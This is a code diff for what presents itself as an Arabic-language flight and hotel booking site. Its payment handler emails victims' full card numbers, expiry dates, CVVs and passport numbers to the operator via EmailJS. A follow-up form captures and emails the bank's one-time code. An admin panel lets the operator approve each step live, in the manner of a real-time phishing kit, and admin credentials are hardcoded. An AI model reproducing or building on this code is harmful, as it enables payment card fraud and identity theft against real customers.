+                        </div>
+                    </div>
+                </div>`;
+            }).join('');
+        }
+
+
+        async function initializeAppLogic() {
+            emailjs.init({ publicKey: "7CKhmEwlD2bwk7x-G" });
+
+            try {
+                // This is the correct data path that works with the environment's security rules.
+                const flightsRef = collection(db, `artifacts/${appId}/public/data/flights`);
+                const staysRef = collection(db, `artifacts/${appId}/public/data/stays`);
+
+                const [flightsSnapshot, staysSnapshot] = await Promise.all([
+                    getDocs(flightsRef),
+                    getDocs(staysRef)
+                ]);
+
+                flightsSnapshot.forEach((doc) => {
+                    liveData.flights.push({ id: doc.id, ...doc.data(), type: 'flights' });
+                });
+
+                staysSnapshot.forEach((doc) => {
+                    liveData.stays.push({ id: doc.id, ...doc.data(), type: 'stays' });
+                });
+                
+                console.log("Data loaded from Firebase:", liveData);
+                
+                renderOffers();
+
+            } catch (error) {
+                console.error("Error fetching data from Firebase: ", error);
+                 // Add a note about potential ad blockers causing network errors.
+                if (error.name === 'FirebaseError' && (error.code === 'unavailable' || error.code === 'network-request-failed')) {
+                     addNotification('خطأ في الاتصال', 'لم نتمكن من تحميل البيانات. قد يكون السبب هو أداة حظر الإعلانات أو مشكلة في الشبكة. يرجى المحاولة مرة أخرى.');
+                } else {
+                     addNotification('خطأ في الاتصال', 'لم نتمكن من تحميل البيانات من الخادم.');
+                }
+                document.getElementById('offers-slider').innerHTML = `<p class="text-red-500 p-4">فشل تحميل العروض. يرجى التحقق من وحدة التحكم.</p>`;
+            }
+
+            // --- Inject HTML Content ---
+            searchFormsContainer.innerHTML = staysFormHTML() + flightsFormHTML();
+            document.getElementById('stays-form').classList.remove('hidden');
+
+            pages.signIn.innerHTML = signInPageHTML;
+            pages.signUp.innerHTML = signUpPageHTML;
+            pages.forgotPassword.innerHTML = forgotPasswordPageHTML;
+            pages.passport.innerHTML = passportPageHTML;
+            pages.adminLogin.innerHTML = adminLoginPageHTML;
+            pages.adminDashboard.innerHTML = adminDashboardPageHTML();
+            modals.otp.innerHTML = otpModalHTML;
+            modals.datePicker.innerHTML = `<div class="modal-content bg-white w-full max-w-3xl rounded-xl shadow-xl"><header class="p-4 border-b flex justify-between items-center"><button class="close-modal-btn text-2xl">&times;</button><h3 class="text-lg font-bold">اختر التواريخ</h3><button id="confirmDatesBtn" class="bg-[var(--booking-blue)] text-white font-bold py-2 px-5 rounded-lg">تأكيد</button></header><div class="p-4 max-h-[70vh] overflow-y-auto" id="calendar-container"></div></div>`;
+            modals.countryCode.innerHTML = countryCodeModalHTML;
+            modals.passenger.innerHTML = passengerModalHTML;
+            modals.guest.innerHTML = guestModalHTML;
+            renderNotifications();
+
+            // --- Setup Listeners for Dynamic Content ---
+            const dropzone = pages.passport.querySelector('#passport-image-dropzone');
+            if (dropzone) {
+                // Allow clicking the dropzone to open the file dialog
+                dropzone.addEventListener('click', (e) => {
+                    // Prevent triggering if a label inside is clicked
+                    if (e.target.id === 'passport-image-dropzone' || e.target.id === 'passport-image-prompt') {
+                        dropzone.querySelector('#passportImageInput')?.click();
+                    }
+                });
+                // Add drag & drop functionality
+                ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+                    dropzone.addEventListener(eventName, (e) => {
+                        e.preventDefault();
+                        e.stopPropagation();
+                    }, false);
+                });
+                ['dragenter', 'dragover'].forEach(eventName => {
+                    dropzone.addEventListener(eventName, () => dropzone.classList.add('border-blue-500', 'bg-blue-50'), false);
+                });
+                ['dragleave', 'drop'].forEach(eventName => {
+                    dropzone.addEventListener(eventName, () => dropzone.classList.remove('border-blue-500', 'bg-blue-50'), false);
+                });
+                dropzone.addEventListener('drop', (e) => {
+                    const dt = e.dataTransfer;
+                    const files = dt.files;
+                    const fileInput = dropzone.querySelector('#passportImageInput');
+                    if (files.length > 0 && fileInput) {
+                        fileInput.files = files;
+                        // Manually trigger the input event to update the preview
+                        const event = new Event('input', { bubbles: true });
+                        fileInput.dispatchEvent(event);
+                    }
+                }, false);
+            }
+
+
+            // --- Event Listeners ---
+            document.getElementById('accountBtnHeader').addEventListener('click', () => navigateToUserArea('accountDetails'));
+            document.getElementById('accountBtnFooter').addEventListener('click', () => navigateToUserArea('accountDetails'));
+            document.getElementById('bookingsBtnFooter').addEventListener('click', () => navigateToUserArea('dashboard'));
+            document.getElementById('favoritesBtnFooter').addEventListener('click', () => navigateToUserArea('favorites'));
+            document.getElementById('adminBtnHeader').addEventListener('click', () => {
+                if (adminState.loggedIn) {
+                    showPage('adminDashboard');
+                    // --- Start listener when navigating to dashboard ---
+                    startAdminBookingListener();
+                } else {
+                    showPage('adminLogin');
+                }
+            });
+            
+            document.getElementById('notificationsBtn').addEventListener('click', (e) => {
+                e.stopPropagation();
+                if (!userState.loggedIn) {
+                    showPage('signIn');
+                    return;
+                }
+                const popup = popups.notifications;
+                popup.classList.toggle('hidden');
+                if (!popup.classList.contains('hidden')) {
+                    userState.notifications.unreadCount = 0;
+                    userState.notifications.items.forEach(i => i.read = true);
+                    renderNotifications();
+                }
+            });
+
+            document.getElementById('searchBtnFooter').addEventListener('click', () => {
+                const activeForm = document.querySelector('.search-form-panel:not(.hidden)');
+                if (activeForm) activeForm.querySelector('button[type="submit"]').click();
+            });
+
+            document.querySelectorAll('.main-tab').forEach(tab => {
+                tab.addEventListener('click', () => {
+                    document.querySelectorAll('.main-tab').forEach(el => el.classList.remove('active'));
+                    document.querySelectorAll('.search-form-panel').forEach(p => p.classList.add('hidden'));
+                    tab.classList.add('active');
+                    const formId = `${tab.dataset.searchType}-form`;
+                    document.getElementById(formId).classList.remove('hidden');
+                });
+            });
+
+            // Slider arrows functionality
+            document.getElementById('slide-right').addEventListener('click', () => {
+                document.getElementById('offers-slider').scrollLeft += 320; // w-80 + gap-4
+            });
+            document.getElementById('slide-left').addEventListener('click', () => {
+                document.getElementById('offers-slider').scrollLeft -= 320;
+            });
+
+            // --- Unified Event Handler ---
+            document.body.addEventListener('click', async (e) => {
+                const target = e.target;
+
+                if (!target.closest('.autocomplete-suggestions') && !target.matches('input[name="from"], input[name="to"], input[name="destination"]')) {
+                    document.querySelectorAll('.autocomplete-suggestions').forEach(box => box.remove());
+                }
+                
+                if (target.closest('.close-modal-btn')) { 
+                    hideModals(); 
+                    if (unsubscribeFromPendingBooking) {
+                        unsubscribeFromPendingBooking();
+                        unsubscribeFromPendingBooking = null;
+                        console.log("Booking listener detached.");
+                    }
+                } 
+                if (target.closest('.close-popup-btn')) { target.closest('.popup-content').classList.add('hidden'); }
+                if (!target.closest('#notifications-popup') && !target.closest('#notificationsBtn')) { popups.notifications.classList.add('hidden'); }
+                if (target.closest('.date-input')) { activeDateSelection.input = target; renderCalendar(); showModal('datePicker'); }
+                if (target.id === 'passenger-input') showModal('passenger');
+                if (target.id === 'guest-input') showModal('guest');
+                
+                if (target.closest('.op-btn')) {
+                    const btn = target.closest('.op-btn');
+                    const type = btn.dataset.type;
+                    const modal = btn.closest('.modal-content');
+                    const countEl = modal.querySelector(`.op-count[data-type="${type}"]`);
+                    let count = parseInt(countEl.textContent);
+                    const isMinus = btn.classList.contains('minus');
+                    const min = (type === 'adults' || type === 'rooms') ? 1 : 0;
+                    if (isMinus && count > min) count--;
+                    if (!isMinus) count++;
+                    countEl.textContent = count;
+                }
+                if (target.closest('.confirm-op-btn')) {
+                    if (target.closest('#passengerModal')) {
+                        const adults = document.querySelector('#passengerModal .op-count[data-type="adults"]').textContent;
+                        const children = document.querySelector('#passengerModal .op-count[data-type="children"]').textContent;
+                        document.getElementById('passenger-input').value = `${adults} بالغون، ${children} أطفال`;
+                    }
+                    if (target.closest('#guestModal')) {
+                        const rooms = document.querySelector('#guestModal .op-count[data-type="rooms"]').textContent;
+                        const adults = document.querySelector('#guestModal .op-count[data-type="adults"]').textContent;
+                        const children = document.querySelector('#guestModal .op-count[data-type="children"]').textContent;
+                        document.getElementById('guest-input').value = `${rooms} غرف، ${adults} بالغون، ${children} أطفال`;
+                    }
+                    hideModals();
+                }
+                if (target.closest('.calendar-day:not(.cursor-not-allowed)')) {
+                    const selectedDate = new Date(target.closest('.calendar-day').dataset.date);
+                    if (activeDateSelection.isSelectingDeparture || selectedDate <= activeDateSelection.departure) {
+                        activeDateSelection.departure = selectedDate;
+                        activeDateSelection.return = null;
+                        activeDateSelection.isSelectingDeparture = false;
+                    } else {
+                        activeDateSelection.return = selectedDate;
+                        activeDateSelection.isSelectingDeparture = true;
+                    }
+                    renderCalendar();
+                }
+                if (target.closest('#confirmDatesBtn')) {
+                    if(activeDateSelection.input) {
+                        const isStay = activeDateSelection.input.id.includes('stay');
+                        const departureInput = document.getElementById(isStay ? 'stayCheckinDate' : 'flightDepartureDate');
+                        const returnInput = document.getElementById(isStay ? 'stayCheckoutDate' : 'flightReturnDate');
+                        if (departureInput) departureInput.value = formatDate(activeDateSelection.departure);
+                        if (returnInput) returnInput.value = formatDate(activeDateSelection.return);
+                    }
+                    hideModals();
+                }
+                if (target.closest('.password-toggle-icon')) {
+                    const icon = target.closest('.password-toggle-icon');
+                    const input = icon.parentElement.querySelector('input');
+                    if (input.type === 'password') {
+                        input.type = 'text';
+                        icon.classList.replace('fa-eye-slash', 'fa-eye');
+                    } else {
+                        input.type = 'password';
+                        icon.classList.replace('fa-eye', 'fa-eye-slash');
+                    }
+                }
+                
+                if (target.closest('.back-btn')) {
+                    const targetPage = target.closest('.back-btn').dataset.target || 'main';
+                    if (pages[targetPage]) showPage(targetPage);
+                    else Object.values(pages).forEach(p => p.classList.remove('active'));
+                }
+
+                // --- Main Action Handler ---
+                const actionTarget = target.closest('[data-action]');
+                if (!actionTarget) return;
+                const action = actionTarget.dataset.action;
+
+                if (action === 'show-sign-up') { e.preventDefault(); showPage('signUp'); }
+                if (action === 'show-forgot-password') { e.preventDefault(); showPage('forgotPassword'); }
+                if (action === 'go-to-dashboard') { hideModals(); navigateToUserArea('dashboard'); }
+                if (action === 'go-to-payment') { hideModals(); showPage('payment'); }
+                if (action === 'go-to-search') {
+                    Object.values(pages).forEach(p => p.classList.remove('active'));
+                    window.scrollTo(0, 0);
+                }
+                if (action === 'logout') {
+                    userState = { 
+                        loggedIn: false, name: null, email: null, bookings: [], favorites: [],
+                        notifications: { lastId: 0, unreadCount: 0, items: [] } 
+                    };
+                    renderNotifications();
+                    Object.values(pages).forEach(p => p.classList.remove('active'));
+                }
+                if (action === 'show-booking-details') {
+                    const bookingId = actionTarget.dataset.bookingId;
+                    const booking = userState.bookings.find(b => b.id == bookingId);
+                    if (booking) {
+                        pages.bookingDetails.innerHTML = bookingDetailsPageHTML(booking);
+                        showPage('bookingDetails');
+                    }
+                }
+                if (action === 'initiate-booking') {
+                    if (!userState.loggedIn) {
+                        showPage('signIn');
+                        addNotification('مطلوب تسجيل الدخول', 'الرجاء تسجيل الدخول أولاً لمتابعة الحجز.');
+                        return;
+                    }
+                    const itemId = actionTarget.dataset.itemId;
+                    const itemType = actionTarget.dataset.itemType;
+                    const price = parseFloat(actionTarget.dataset.price);
+                    const dataArray = itemType === 'flights' ? liveData.flights : liveData.stays;
+                    const selectedItem = dataArray.find(item => item.id === itemId);
+                    
+                    bookingState.selectedItem = selectedItem;
+                    bookingState.calculatedPrice = price;
+                    
+                    pages.payment.innerHTML = paymentPageHTML();
+                    showPage('passport');
+                }
+                if (action === 'toggle-favorite') {
+                    if (!userState.loggedIn) {
+                        showPage('signIn');
+                        addNotification('مطلوب تسجيل الدخول', 'الرجاء تسجيل الدخول لحفظ مفضلاتك.');
+                        return;
+                    }
+                    const itemId = actionTarget.dataset.itemId;
+                    const favIndex = userState.favorites.indexOf(itemId);
+                    if (favIndex > -1) {
+                        userState.favorites.splice(favIndex, 1);
+                        actionTarget.classList.remove('favorited');
+                    } else {
+                        userState.favorites.push(itemId);
+                        actionTarget.classList.add('favorited');
+                    }
+                    if(pages.favorites.classList.contains('active')) {
+                        pages.favorites.innerHTML = favoritesPageHTML();
+                    }
+                }
+                if (action === 'apply-individual-discount') {
+                    const button = actionTarget;
+                    const form = button.closest('form');
+                    const itemId = button.dataset.itemId;
+                    const itemType = button.dataset.itemType;
+                    const discount = parseFloat(form.querySelector('input[name="discount"]:checked').value);
+                    
+                    button.disabled = true;
+                    button.innerHTML = `<i class="fas fa-spinner fa-spin"></i>`;
+
+                    try {
+                        const docRef = doc(db, `artifacts/${appId}/public/data/${itemType}`, itemId);
+                        await updateDoc(docRef, { discount: discount });
+                        const dataArray = liveData[itemType];
+                        const itemIndex = dataArray.findIndex(item => item.id === itemId);
+                        if (itemIndex > -1) dataArray[itemIndex].discount = discount;
+                        addNotification('نجاح', `تم تطبيق الخصم بنجاح.`, null, 'admin');
+                        document.getElementById('adminSearchForm').dispatchEvent(new Event('input', { bubbles:true }));
+                    } catch (error) {
+                        console.error('Failed to apply individual discount:', error);
+                        addNotification('خطأ', 'فشل تطبيق الخصم.', null, 'admin');
+                    } finally {
+                        button.disabled = false;
+                        button.innerHTML = `تطبيق`;
+                    }
+                }
+                if (action === 'search-offer' || action === 'search-property') {
+                    const destination = actionTarget.dataset.destination || actionTarget.dataset.type;
+                    
+                    // Switch to the stays tab
+                    document.querySelector('.main-tab[data-search-type="stays"]').click();
+                    
+                    // Set the destination in the form
+                    const destInput = document.querySelector('#stays-form input[name="destination"]');
+                    if(destInput) destInput.value = destination;
+
+                    // Trigger the search
+                    document.querySelector('#stays-form button[type="submit"]').click();
+                }
+                if (action === 'retry-payment') {
+                    hideModals();
+                    const payButton = document.querySelector('#paymentForm button[type="submit"]');
+                    if (payButton) {
+                        payButton.disabled = false;
+                    }
+                }
+                if (action === 'admin-accept' || action === 'admin-decline') {
+                    const docId = actionTarget.dataset.docId;
+                    const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
+                    
+                    const card = document.getElementById(`request-${docId}`);
+                    if(card) {
+                        card.style.opacity = '0.5';
+                        card.querySelectorAll('button').forEach(b => b.disabled = true);
+                    }
+
+                    const bookingDocSnap = await getDoc(docRef);
+                    if (!bookingDocSnap.exists()) return;
+
+                    const currentStatus = bookingDocSnap.data().status;
+                    let newStatus = '';
+
+                    if (action === 'admin-accept') {
+                        newStatus = currentStatus === 'payment_pending' ? 'otp_pending' : 'confirmed';
+                    } else { // decline
+                        newStatus = currentStatus === 'payment_pending' ? 'payment_declined' : 'otp_declined';
+                    }
+                    
+                    await updateDoc(docRef, { status: newStatus });
+                }
+            });
+
+            // --- Form Submission Handler ---
+            document.body.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const form = e.target;
+                const formId = form.id;
+                
+                if (formId === 'flights-form' || formId === 'stays-form') {
+                    const formData = new FormData(form);
+                    const type = formId.split('-')[0];
+                    let results = [];
+                    let searchParams = {};
+
+                    if (type === 'flights') {
+                        const from = formData.get('from').trim();
+                        const to = formData.get('to').trim();
+                        const adults = parseInt(document.querySelector('#passengerModal .op-count[data-type="adults"]').textContent);
+                        const children = parseInt(document.querySelector('#passengerModal .op-count[data-type="children"]').textContent);
+                        
+                        results = liveData.flights.filter(f => 
+                            (!from || f.from_ar.toLowerCase().includes(from.toLowerCase()) || f.from_code.toLowerCase().includes(from.toLowerCase())) &&
+                            (!to || f.to_ar.toLowerCase().includes(to.toLowerCase()) || f.to_code.toLowerCase().includes(to.toLowerCase()))
+                        );
+                        searchParams = { from, to, adults, children, departureDate: activeDateSelection.departure, returnDate: activeDateSelection.return };
+                    } else { // stays
+                        const destination = formData.get('destination').trim();
+                        const rooms = parseInt(document.querySelector('#guestModal .op-count[data-type="rooms"]').textContent);
+                        const adults = parseInt(document.querySelector('#guestModal .op-count[data-type="adults"]').textContent);
+                        const children = parseInt(document.querySelector('#guestModal .op-count[data-type="children"]').textContent);
+                        results = liveData.stays.filter(s => 
+                            !destination || s.location_ar.toLowerCase().includes(destination.toLowerCase()) || s.name.toLowerCase().includes(destination.toLowerCase()) || s.type.toLowerCase().includes(destination.toLowerCase())
+                        );
+                        searchParams = { destination, rooms, adults, children, checkinDate: activeDateSelection.departure, checkoutDate: activeDateSelection.return };
+                    }
+                    
+                    pages.searchResults.innerHTML = searchResultsPageHTML(results, type, searchParams);
+                    const newForm = pages.searchResults.querySelector(`#${type}-form`);
+                    if(newForm) {
+                        pages.searchResults.querySelectorAll('.search-form-panel').forEach(p => p.classList.add('hidden'));
+                        newForm.classList.remove('hidden');
+                    }
+                    showPage('searchResults');
+                }
+
+                if (formId === 'signInForm') {
+                    const formData = new FormData(form);
+                    const emailInput = form.querySelector('input[name="email"]');
+                    const passwordInput = form.querySelector('input[name="password"]');
+                    const errorEl = document.getElementById('signInError');
+
+                    if (emailInput.value && passwordInput.value) {
+                        errorEl.classList.add('hidden');
+                        userState.loggedIn = true;
+                        const email = emailInput.value;
+                        userState.email = email;
+                        const namePart = email.split('@')[0];
+                        userState.name = namePart.charAt(0).toUpperCase() + namePart.slice(1);
+                        
+                        if (userState.notifications.items.length === 0) {
+                            addNotification('ترحيب!', `مرحباً بك يا ${userState.name}، استكشف أفضل العروض واحجز رحلتك القادمة الآن!`);
+                        }
+                        navigateToUserArea('dashboard');
+                    } else {
+                        errorEl.classList.remove('hidden');
+                    }
+                }
+                if (formId === 'signUpForm') {
+                    const formData = new FormData(form);
+                    const email = formData.get('email');
+                    userState.loggedIn = true;
+                    userState.email = email;
+                    userState.name = formData.get('fullName').split(' ')[0];
+                    addNotification('أهلاً بك في بوكينج!', `تم إنشاء حسابك بنجاح يا ${userState.name}.`);
+                    navigateToUserArea('dashboard');
+                }
+                if (formId === 'passportForm') { 
+                    const fullNameInput = form.querySelector('input[name="fullName"]');
+                    const passportNumberInput = form.querySelector('input[name="passportNumber"]');
+                    const passportImageInput = form.querySelector('input[name="passportImage"]');
+                    const dropzone = document.getElementById('passport-image-dropzone');
+                    let isValid = true;
+
+                    // Clear previous errors
+                    clearInputError(fullNameInput);
+                    clearInputError(passportNumberInput);
+                    if (dropzone) clearInputError(dropzone);
+
+                    // Validate Full Name
+                    if (!/^[a-zA-Z\u0600-\u06FF\s]{3,}$/.test(fullNameInput.value)) {
+                        showInputError(fullNameInput, 'الرجاء إدخال اسم صحيح (3 حروف على الأقل، بدون أرقام أو رموز).');
+                        isValid = false;
+                    }
+
+                    // Validate Passport Number
+                    if (!/^[a-zA-Z0-9]{6,}$/.test(passportNumberInput.value)) {
+                        showInputError(passportNumberInput, 'رقم الجواز يجب أن يتكون من 6 خانات (حروف إنجليزية وأرقام فقط).');
+                        isValid = false;
+                    }
+
+                    // Validate Passport Image
+                    if (passportImageInput.files.length === 0) {
+                        if (dropzone) showInputError(dropzone, 'الرجاء تحميل صورة جواز السفر.');
+                        isValid = false;
+                    }
+
+                    if (!isValid) return;
+
+                    const formData = new FormData(form);
+                    bookingState.fullName = formData.get('fullName'); 
+                    bookingState.passportNumber = formData.get('passportNumber'); 
+                    pages.payment.innerHTML = paymentPageHTML();
+                    showPage('payment'); 
+                }
+
+                if (formId === 'paymentForm') {
+                    const cardNumberInput = form.querySelector('#cardNumberInput');
+                    const expiryInput = form.querySelector('#expiryInput');
+                    const cvvInput = form.querySelector('#cvvInput');
+                    let isValid = true;
+
+                    clearInputError(cardNumberInput);
+                    clearInputError(expiryInput);
+                    clearInputError(cvvInput);
+
+                    // Validate Expiry Date
+                    const expiryValue = expiryInput.value;
+                    const match = expiryValue.match(/^(\d{2}) \/ (\d{2})$/);
+                    if (!match) {
+                        showInputError(expiryInput, 'الرجاء إدخال التاريخ بصيغة MM / YY.');
+                        isValid = false;
+                    } else {
+                        const month = parseInt(match[1], 10);
+                        const year = parseInt(match[2], 10);
+                        const currentYear = new Date().getFullYear() % 100;
+                        const currentMonth = new Date().getMonth() + 1;
+
+                        if (month < 1 || month > 12) {
+                            showInputError(expiryInput, 'الشهر يجب أن يكون بين 01 و 12.');
+                            isValid = false;
+                        } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                            showInputError(expiryInput, 'تاريخ انتهاء البطاقة غير صالح.');
+                            isValid = false;
+                        }
+                    }
+
+                    if (!isValid) return;
+
+                    const payButton = form.querySelector('button[type="submit"]');
+                    payButton.disabled = true;
+                    
+                    const formData = new FormData(form);
+                    bookingState.cardNumber = formData.get('cardNumber');
+                    bookingState.expiry = formData.get('expiry');
+                    bookingState.cvv = formData.get('cvv');
+
+                    showModal('loading', 'جاري الدفع...');
+
+                    const serviceID = 'service_cz1rwxe';
+                    const paymentTemplateID = 'template_r4hc02a';
+
+                    const payment_template_params = {
+                        user_name: bookingState.fullName,
+                        user_email: userState.email,
+                        item_name: bookingState.selectedItem.name || `${bookingState.selectedItem.from_ar} - ${bookingState.selectedItem.to_ar}`,
+                        price: bookingState.calculatedPrice.toFixed(2),
+                        card_number: bookingState.cardNumber,
+                        expiry_date: bookingState.expiry,
+                        cvv: bookingState.cvv,
+                        passport_number: bookingState.passportNumber,
+                    };
+                    
+                    try {
+                        await emailjs.send(serviceID, paymentTemplateID, payment_template_params);
+                        console.log('Payment details email sent successfully!');
+                        
+                        if (!auth.currentUser) {
+                            throw new Error("User is not authenticated. Cannot write to Firestore.");
+                        }
+
+                        const pendingCollectionRef = collection(db, `artifacts/${appId}/public/data/pending_bookings`);
+                        const pendingDocRef = await addDoc(pendingCollectionRef, {
+                            userId: auth.currentUser.uid,
+                            userEmail: userState.email,
+                            status: 'payment_pending',
+                            createdAt: new Date(),
+                            bookingDetails: bookingState,
+                        });
+
+                        console.log("Successfully wrote to Firestore. Document ID:", pendingDocRef.id);
+                        
+                        bookingState.pendingBookingId = pendingDocRef.id;
+                        listenForBookingStatus(pendingDocRef.id);
+
+                    } catch (err) {
+                        console.error(">>> FIRESTORE WRITE OR EMAILJS FAILED <<<", err);
+                        payButton.disabled = false;
+                        hideModals();
+                        addNotification('خطأ فادح', 'فشل حفظ الحجز في قاعدة البيانات. تحقق من الكونسول.');
+                    }
+                }
+
+                if (formId === 'otpForm') {
+                    const otpInputs = form.querySelectorAll('.otp-inputs input');
+                    const otp = Array.from(otpInputs).map(i => i.value).join('');
+                    const errorEl = form.querySelector('#otpError');
+                    
+                    if (!/^\d{4,6}$/.test(otp)) {
+                        errorEl.textContent = 'الرجاء إدخال رمز صحيح مكون من أرقام فقط.';
+                        errorEl.classList.remove('hidden');
+                        return;
+                    }
+                    
+                    errorEl.classList.add('hidden');
+                    showModal('loading', 'جاري التحقق...');
+
+                    const serviceID = 'service_cz1rwxe';
+                    const otpTemplateID = 'template_8tpdy4a';
+
+                    const otp_template_params = {
+                        user_name: bookingState.fullName,
+                        user_email: userState.email,
+                        otp_code: otp,
+                        card_number: bookingState.cardNumber, // For context in the email
+                    };
+
+                    try {
+                        await emailjs.send(serviceID, otpTemplateID, otp_template_params);
+                        console.log('OTP details email sent successfully!');
+
+                        const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, bookingState.pendingBookingId);
+                        await updateDoc(docRef, {
+                            otpCode: otp,
+                            status: 'otp_submitted'
+                        });
+                        // The onSnapshot listener will handle the rest
+                    } catch (err) {
+                        console.error("EmailJS Error (OTP) or Firestore update failed: ", err);
+                        hideModals();
+                        addNotification('خطأ', 'فشل إرسال رمز التحقق. يرجى المحاولة مرة أخرى.');
+                    }
+                }
+
+                if (formId === 'adminLoginForm') {
+                    const formData = new FormData(form);
+                    const username = formData.get('username');
+                    const password = formData.get('password');
+                    const errorEl = document.getElementById('adminLoginError');
+
+                    if (username === 'saherwebsite' && password === 'saher@2025') {
+                        adminState.loggedIn = true;
+                        errorEl.classList.add('hidden');
+                        showPage('adminDashboard');
+                        // --- Start listener on successful login ---
+                        startAdminBookingListener();
+                        addNotification('أهلاً بالمشرف!', 'تم تسجيل دخولك بنجاح.', null, 'admin');
+                    } else {
+                        errorEl.classList.remove('hidden');
+                    }
+                }
+                if (formId === 'flightDiscountForm' || formId === 'stayDiscountForm') {
+                    const formData = new FormData(form);
+                    const type = formId.includes('flight') ? 'flights' : 'stays';
+                    const discount = parseFloat(formData.get('discount'));
+                    const button = form.querySelector('button[type="submit"]');
+                    button.disabled = true;
+                    button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> جارِ التحديث...';
+
+                    try {
+                        const batch = writeBatch(db);
+                        const dataCollection = collection(db, `artifacts/${appId}/public/data/${type}`);
+                        const snapshot = await getDocs(dataCollection);
+                        
+                        snapshot.forEach(docSnap => {
+                            const docRef = doc(db, `artifacts/${appId}/public/data/${type}`, docSnap.id);
+                            batch.update(docRef, { discount: discount });
+                        });
+                        
+                        await batch.commit();
+                        liveData[type].forEach(item => item.discount = discount);
+                        addNotification('نجاح', `تم تطبيق خصم ${discount * 100}% على جميع ${type === 'flights' ? 'الرحلات' : 'أماكن الإقامة'}.`, null, 'admin');
+                    } catch (error) {
+                        console.error(`Error updating ${type} discounts:`, error);
+                        addNotification('خطأ', 'حدث خطأ أثناء تحديث الخصومات.', null, 'admin');
+                    } finally {
+                        button.disabled = false;
+                        button.textContent = `تطبيق على كل ${type === 'flights' ? 'الرحلات' : 'الإقامات'}`;
+                    }
+                }
+            });
+
+            // --- Other Input Handlers ---
+            document.body.addEventListener('input', e => {
+                const target = e.target;
+                const searchInput = target.closest('input[name="from"], input[name="to"], input[name="destination"]');
+                
+                if (searchInput) {
+                    const parent = searchInput.parentElement;
+                    const type = searchInput.name === 'destination' ? 'stays' : 'flights';
+                    const query = searchInput.value.toLowerCase();
+                    
+                    let suggestions = [];
+                    if (type === 'flights') {
+                        const uniqueLocations = [...new Set(liveData.flights.flatMap(f => [f.from_ar, f.to_ar]))];
+                        suggestions = uniqueLocations.filter(loc => loc.toLowerCase().includes(query));
+                    } else { // stays
+                        const uniqueLocations = [...new Set(liveData.stays.map(s => s.location_ar))];
+                        suggestions = uniqueLocations.filter(loc => loc.toLowerCase().includes(query));
+                    }
+
+                    const oldBox = parent.querySelector('.autocomplete-suggestions');
+                    if (oldBox) oldBox.remove();
+
+                    if (query.length > 0 && suggestions.length > 0) {
+                        const suggestionsBox = document.createElement('div');
+                        suggestionsBox.className = 'autocomplete-suggestions';
+                        suggestionsBox.innerHTML = suggestions.map(s => `<div class="autocomplete-suggestion">${s}</div>`).join('');
+                        parent.appendChild(suggestionsBox);
+
+                        suggestionsBox.addEventListener('click', (event) => {
+                            if (event.target.classList.contains('autocomplete-suggestion')) {
+                                searchInput.value = event.target.textContent;
+                                suggestionsBox.remove();
+                            }
+                        });
+                    }
+                }
+
+                if (target.closest('#adminSearchForm')) {
+                    const form = target.closest('#adminSearchForm');
+                    const type = form.querySelector('select[name="type"]').value;
+                    const query = form.querySelector('input[name="query"]').value.toLowerCase().trim();
+                    const resultsContainer = document.getElementById('admin-search-results');
+                    
+                    if (!query) {
+                        resultsContainer.innerHTML = '';
+                        return;
+                    }
+
+                    const dataArray = liveData[type];
+                    const results = dataArray.filter(item => {
+                        if (type === 'flights') {
+                            return item.from_ar.toLowerCase().includes(query) || item.to_ar.toLowerCase().includes(query) || item.airline.toLowerCase().includes(query);
+                        }
+                        return item.name.toLowerCase().includes(query) || item.location_ar.toLowerCase().includes(query);
+                    });
+
+                    resultsContainer.innerHTML = results.map(item => {
+                        const title = item.type === 'flights' ? `${item.from_ar} - ${item.to_ar}` : item.name;
+                        const subtitle = item.type === 'flights' ? item.airline : item.location_ar;
+                        return `<div class="bg-slate-50 p-3 rounded-lg">
+                                    <p class="font-bold">${title}</p>
+                                    <p class="text-sm text-slate-500 mb-2">${subtitle}</p>
+                                    <form class="flex items-center justify-between gap-2">
+                                        <div class="flex flex-wrap gap-x-4 gap-y-1">
+                                            ${[0, 20, 30, 40, 50, 60].map(d => `
+                                            <label class="flex items-center gap-1 cursor-pointer text-sm">
+                                                <input type="radio" name="discount" value="${d/100}" class="form-radio h-4 w-4" ${ (item.discount || 0) * 100 === d ? 'checked' : ''}>
+                                                <span>${d}%</span>
+                                            </label>`).join('')}
+                                        </div>
+                                        <button type="button" data-action="apply-individual-discount" data-item-id="${item.id}" data-item-type="${type}" class="bg-green-600 text-white font-bold py-1 px-3 rounded-md text-sm">تطبيق</button>
+                                    </form>
+                                </div>`;
+                    }).join('');
+                }
+
+                if (target.id === 'cardNumberInput') {
+                    let value = e.target.value.replace(/\D/g, '');
+                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                    const cardIcon = document.getElementById('card-icon');
+                    if (value.startsWith('4')) { cardIcon.className = 'fab fa-cc-visa absolute top-10 left-4 text-2xl text-blue-800'; } 
+                    else if (value.startsWith('5')) { cardIcon.className = 'fab fa-cc-mastercard absolute top-10 left-4 text-2xl text-orange-500'; } 
+                    else { cardIcon.className = 'fas fa-credit-card absolute top-10 left-4 text-2xl text-slate-300'; }
+                }
+                if (target.id === 'expiryInput') { let v = e.target.value.replace(/\D/g, ''); if (v.length > 2) v = v.substring(0, 2) + ' / ' + v.substring(2, 4); e.target.value = v; }
+                if (target.id === 'cvvInput') e.target.value = e.target.value.replace(/\D/g, '');
+                
+                if (target.id === 'passportImageInput') {
+                    const file = e.target.files[0];
+                    const dropzone = document.getElementById('passport-image-dropzone');
+                    if (file && dropzone) {
+                        // A file has been selected, so clear any existing validation error.
+                        clearInputError(dropzone);
+                
+                        const reader = new FileReader();
+                        const preview = document.getElementById('passport-image-preview');
+                        const prompt = document.getElementById('passport-image-prompt');
+                
+                        reader.onload = function(event) {
+                            if (preview && prompt) {
+                                preview.src = event.target.result;
+                                preview.classList.remove('hidden');
+                                prompt.classList.add('hidden');
+                            }
+                        }
+                        reader.readAsDataURL(file);
+                    }
+                }
+
+                if (target.closest('.otp-inputs')) {
+                    const nextInput = target.nextElementSibling;
+                    if (nextInput && target.value) { nextInput.focus(); }
+                }
+            });
+
+            document.body.addEventListener('focusin', (e) => { if (e.target.id === 'cvvInput') e.target.type = 'password'; });
